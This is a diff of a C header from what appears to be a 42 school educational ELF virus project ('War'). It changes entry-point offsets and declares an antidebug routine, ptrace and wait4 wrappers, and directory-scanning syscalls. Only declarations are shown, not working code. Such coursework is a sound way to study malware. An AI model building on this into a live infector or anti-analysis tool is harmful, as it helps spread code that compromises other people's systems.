@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/09 21:50:14 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/10 23:35:23 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -25,6 +25,11 @@
 # include <stdlib.h>
 # include <limits.h>
 # include <sys/ptrace.h>
+# include <sys/time.h>
+# include <sys/resource.h>
+# include <sys/wait.h>
+
+
 /* Enum */
 
 /* Define */
@@ -44,9 +49,9 @@
 # define PROG_INFO	512
 
 # ifdef DEBUG
-#  define ENTRY_OFF	2392
+#  define ENTRY_OFF	2471
 # else
-#  define ENTRY_OFF 2183
+#  define ENTRY_OFF 218
 # endif
 
 # define KEY_OFF	28
@@ -119,14 +124,16 @@ typedef struct	s_data
 	Elf64_Addr	vrs_entry;
 	Elf64_Addr	cpr_entry;
 
-	char		*name;
+	void		*name;
 	void		*rsp;
 	uint8_t		cpr_key[KEY_SIZE];
 	size_t		context;
+
 }				t_data;
 
 /* Core */
 void			start(void);
+void			antidebug(t_data *data);
 void			opening(t_data *data);
 void			war(t_data *data);
 void			locate(t_data *data, t_directory *dir);
@@ -159,6 +166,8 @@ int				_ptrace(long request, long pid ,unsigned long addr, unsigned long data);
 void			_log(char *msg, size_t size);
 pid_t			_fork(void);
 int				_execve(const char *filename, char *const argv[], char *const envp[]);
+int				_getppid(void);
+pid_t			_wait4(pid_t pid, int *stat_addr, int options, struct rusage *ru);
 void			__exit(int status);
 int				_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 int				_open(const char *path, int flags, mode_t mode);
